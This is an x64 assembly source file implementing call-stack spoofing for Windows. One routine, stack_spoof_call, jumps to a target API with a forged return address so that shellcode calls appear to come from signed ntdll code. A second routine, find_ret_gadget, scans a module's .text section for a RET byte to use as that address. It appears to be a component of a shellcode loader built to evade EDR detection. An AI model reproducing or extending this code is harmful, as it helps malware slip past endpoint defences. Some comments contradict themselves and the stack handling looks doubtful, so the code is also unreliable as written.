.section .text
.globl stack_spoof_call

# ── stack_spoof_call ──────────────────────────────────────────────────────────
# Calls a target Win32 API function with a spoofed return address.
#
# Technique: before calling the target, replace the return address on the
# stack with a fake address from a legitimate signed Microsoft module. When
# the target function does RET (on return from a syscall), the kernel-mode
# stack walker sees the return going to the signed module instead of our
# shellcode region, evading EDR call stack inspection.
#
# The fake return address should point to a simple "RET" (0xC3) gadget
# inside ntdll.dll's .text section (found at runtime by the PEB walker).
# After the gadget's RET, execution continues at our post-call stub, which
# restores the real return address.
#
# Input (Windows x64 ABI):
#   RCX = target function pointer (e.g., resolved via api_resolve_ror13)
#   RDX = spoofed return address (RET gadget in a signed Microsoft module)
#   R8  = 1st argument for target (RCX at call time)
#   R9  = 2nd argument for target (RDX at call time)
#   [RSP+0x28] = 3rd argument for target
#   [RSP+0x30] = 4th argument for target
#   ...         = subsequent arguments
#
# Returns: RAX = return value from target function
# ──────────────────────────────────────────────────────────────────────────────

stack_spoof_call:
    # ── Prologue ──
    pushq   %rbp
    movq    %rsp, %rbp
    pushq   %rbx                    # save non-volatile
    pushq   %rsi                    # save non-volatile
    pushq   %rdi                    # save non-volatile

    # rbx = target, rsi = spoofed_ret, rdi = arg1
    movq    %rcx, %rbx
    movq    %rdx, %rsi
    movq    %r8,  %rdi

    # ── Save the real return address ──
    # Our caller's return address is at [rbp + 0x10] (+0x08 for saved rbp,
    # though we didn't push a return addr via CALL — this was called via CALL)
    # Actually at function entry (before push rbp):
    #   [rsp]     = return to our caller
    # After push rbp; mov rsp, rbp:
    #   [rbp+0x08] = return to our caller
    # After push rbx/rsi/rdi:
    #   [rbp+0x08] still has return to our caller
    movq    0x08(%rbp), %r10        # r10 = real return to our caller

    # ── Overwrite the return address with spoofed_ret ──
    # This is the address on the stack that the TARGET will see.
    # However, CALL pushes a NEW return address, so our overwrite is
    # on the current stack frame, not the target's.
    #
    # The trick: we PUSH the spoofed_ret as the return for a JMP.
    # We push our continuation, then spoofed_ret, then JMP to target.
    # The target does RET → jumps to spoofed_ret (a RET gadget in a
    # signed module). The gadget does RET → pops our continuation address
    # and jumps there. Our continuation restores the real caller's return.

    leaq    .Lcont(%rip), %r11      # r11 = continuation address
    pushq   %r11                    # continuation (pushed first, at bottom)
    pushq   %rsi                    # spoofed_ret (pushed last, at top)

    # Now stack at target entry:
    #   [RSP]     = spoofed_ret    ← target returns here
    #   [RSP+0x08] = cont_addr     ← spoofed_ret's RET jumps here
    #   [RSP+0x10] = saved rdi     ← target sees this as first stack arg
    #   [RSP+0x18] = saved rsi
    #   [RSP+0x20] = saved rbx
    #   [RSP+0x28] = saved rbp
    #   [RSP+0x30] = return_to_caller
    #
    # For a clean call we must also handle the 32 bytes of shadow space
    # that Windows x64 functions expect. The original caller already
    # allocated shadow space if needed. Since we're JMPing (not CALLing),
    # we need to ensure RSP is properly aligned and shadow space exists.
    #
    # The target function uses:
    #   RCX = arg1, RDX = arg2, R8 = arg3, R9 = arg4
    #   Stack args start at [RSP+0x20] (after shadow space + return addr)

    # ── Set up target arguments ──
    # Argument layout from C++ caller (stack_spoof_call extern):
    #   RCX = target func, RDX = spoofed_ret, R8 = arg1, R9 = arg2
    #   [RBP+0x10] = arg3, [RBP+0x18] = arg4
    movq    %rdi, %rcx              # RCX = arg1 (was in R8 for bridge)
    movq    %r9, %rdx               # RDX = arg2 (was in R9 for bridge)
    movq    0x10(%rbp), %r8         # R8 = arg3 (was on stack)
    movq    0x18(%rbp), %r9         # R9 = arg4 (was on stack)

    # ── Jump to target ──
    # Using JMP (not CALL) so no return address is pushed.
    # The target's RET will go to spoofed_ret.
    # The gadget's RET will go to .Lcont.
    jmp     *%rbx

.Lcont:
    # ── Post-call cleanup ──
    # Remove the two QWORDs we pushed (spoofed_ret + cont)
    addq    $16, %rsp

    # Restore saved registers
    popq    %rdi
    popq    %rsi
    popq    %rbx
    popq    %rbp

    # Return to the original caller
    ret


# ── find_ret_gadget ──────────────────────────────────────────────────────────
# Finds the first "RET" (0xC3) byte within a signed module's .text section.
# This serves as the spoofed return address for stack_spoof_call.
#
# Input:
#   RCX = module base address (e.g., ntdll.dll from peb_get_ntdll)
# Returns:
#   RAX = address of a RET (0xC3) instruction within .text, or NULL
# ──────────────────────────────────────────────────────────────────────────────
.globl find_ret_gadget

find_ret_gadget:
    pushq   %rbx
    pushq   %rsi
    pushq   %rdi

    movq    %rcx, %rsi              # rsi = module base

    # Retrieve DOS header → e_lfanew
    movzwq  0x3C(%rsi), %rax
    addq    %rsi, %rax              # rax = PE header

    # Locate .text section header
    movzwq  0x14(%rax), %rdi        # rdi = SizeOfOptionalHeader
    leaq    0x18(%rax, %rdi), %rdi  # rdi = first section header
    xorl    %r8d, %r8d              # r8 = section index
    movzwl  0x06(%rax), %r9d        # r9 = NumberOfSections

.Lsection_loop:
    cmpq    %r8, %r9
    je      .Lnot_found

    # Check section name for ".text"
    movl    (%rdi), %eax            # first 4 bytes of name
    cmpl    $0x74786574, %eax       # ".tex" little-endian
    jne     .Lnext_section

    movl    4(%rdi), %eax           # next 4 bytes
    cmpl    $0x00000074, %eax       # "t\0\0\0"
    jne     .Lnext_section

    # Found .text section
    movl    0x0C(%rdi), %r10d       # r10d = VirtualAddress
    addq    %rsi, %r10              # r10 = absolute start of .text
    movl    0x08(%rdi), %r11d       # r11d = VirtualSize

    # Scan for 0xC3 (RET)
    xorl    %ecx, %ecx
.Lscan:
    cmpl    %r11d, %ecx
    jae     .Lnot_found

    cmpb    $0xC3, (%r10, %rcx)     # RET instruction?
    je      .Lfound

    incq    %rcx
    jmp     .Lscan

.Lfound:
    leaq    (%r10, %rcx), %rax      # rax = address of RET gadget
    popq    %rdi
    popq    %rsi
    popq    %rbx
    ret

.Lnext_section:
    addq    $0x28, %rdi             # each section header is 40 bytes
    incq    %r8
    jmp     .Lsection_loop

.Lnot_found:
    xorl    %eax, %eax
    popq    %rdi
    popq    %rsi
    popq    %rbx
    ret
